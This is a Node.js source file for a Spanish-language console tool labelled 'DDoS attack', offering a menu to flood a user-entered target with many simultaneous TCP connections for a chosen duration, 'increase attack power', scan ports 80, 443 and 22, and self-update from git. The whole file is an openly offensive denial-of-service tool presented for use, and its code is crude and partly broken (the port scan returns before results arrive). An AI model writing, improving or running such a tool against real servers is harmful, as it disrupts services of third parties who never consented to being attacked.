const net = require('net');
const rl = require('readline').createInterface({
input: process.stdin,
output: process.stdout
});

const dns = require('dns');
const os = require('os');
const tls = require('tls');

const colors = {
reset: '[0m',
bright: '[1m',
dim: '[2m',
underscore: '[4m',
blink: '[5m',
reverse: '[7m',
hidden: '[8m',
fg: {
black: '[30m',
red: '[31m',
green: '[32m',
yellow: '[33m',
blue: '[34m',
magenta: '[35m',
cyan: '[36m',
white: '[37m',
},
bg: {
black: '[40m',
red: '[41m',
green: '[42m',
yellow: '[43m',
blue: '[44m',
magenta: '[45m',
cyan: '[46m',
white: '[47m',
},
};

const decorations = {
underline: '[4m',
bold: '[1m',
italic: '[3m',
};

const portScan = async (host, ports) => {
const results = [];
for (let i = 0; i < ports.length; i++) {
const port = ports[i];
const socket = new net.Socket();
socket.connect(port, host, () => {
results.push(`${port} is open`);
socket.destroy();
});
socket.on('error', (err) => {
results.push(`${port} is closed`);
});
}
return results;
};

const securityScan = async (host) => {
const results = {
ports: await portScan(host, [80, 443, 22])
};
return results;
};

const ddosAttack = async (url, numConnections, attackDuration) => {
try {
console.log(`[36m Iniciando ataque DDoS...`);
const sockets = [];
for (let i = 0; i < numConnections; i++) {
const socket = new net.Socket();
socket.connect(80, url, () => {
console.log(`[32m Conectado a ${url}`);
});
socket.on('data', (data) => {
console.log(`[32m Dato recibido de ${url}`);
});
socket.on('error', (err) => {
console.error(`Error: ${err}`);
});
sockets.push(socket);
}

setTimeout(() => {
console.log('[32m Ataque finalizado');
sockets.forEach((socket) => socket.destroy());
}, attackDuration * 1000);
} catch (error) {
console.error(`Error: ${error}`);
}
};

const updateCode = async () => {
try {
console.log(`[32m Actualizando código...`);
const exec = require('child_process').exec;
exec('git pull origin main', (error, stdout, stderr) => {
if (error) {
console.error(`Error: ${error}`);
} else {
console.log(`[32m Código actualizado correctamente!`);
}
});
} catch (error) {
console.error(`Error: ${error}`);
}
};

const showMenu = () => {
console.clear(); 
console.log('[32m         DDoS attack    ');
console.log('⭐️ Desarrollado por Keiji821');
console.log('[32m ⸂⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⎺⸃');
console.log('[32m ︳1. Iniciar ataque DDoS                ︳');
console.log('[32m ︳2. Actualizar código                  ︳');
console.log('[32m ︳3. Configurar conexiones simultaneas  ︳');
console.log('[32m ︳4. Aumentar potencia del ataque       ︳');
console.log('[32m ︳5. Realizar análisis de seguridad     ︳');
console.log('[32m ︳6. Salir                              ︳');
console.log('[32m ⸌⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⎽⸍');
rl.setPrompt('[32m  🌐➤ '); 
rl.prompt(); 
};

let numConnections = 100; 
let attackDuration = 60; 

showMenu(); 

rl.on('line', (option) => {
switch (option.trim()) {
case '1':
console.log('Ingrese la URL del objetivo: ');
rl.question('URL: ', (url) => {
if (url === '') {
console.log('URL invalida');
showMenu();
} else {
ddosAttack(url, numConnections, attackDuration);
showMenu(); 
}
});
break;
case '2':
updateCode();
showMenu(); 
break;
case '3':
console.log('Ingrese el número de conexiones simultaneas: ');
rl.question('Conexiones: ', (conexiones) => {
if (conexiones === '') {
console.log('Valor invalido');
showMenu();
} else {
numConnections = parseInt(conexiones);
console.log(`Conexiones simultaneas establecidas en ${numConnections}`);
showMenu(); 
}
});
break;
case '4':
console.log('Ingrese la duración del ataque (en segundos): ');
rl.question('Duración: ', (duration) => {
if (duration === '') {
console.log('Valor invalido');
showMenu();
} else {
attackDuration = parseInt(duration);
console.log(`Duración del ataque establecida en ${attackDuration} segundos`);
showMenu(); 
}
});
break;
case '5':
console.log('Ingrese la URL del objetivo para el análisis de seguridad: ');
rl.question('URL: ', (url) => {
if (url === '') {
console.log('URL invalida');
showMenu();
} else {
securityScan(url).then((results) => {
console.log(results);
showMenu(); 
});
}
});
break;
case '6':
console.log('Saliendo...');
process.exit();
break;
}
}).on('close', () => {
process.exit();
});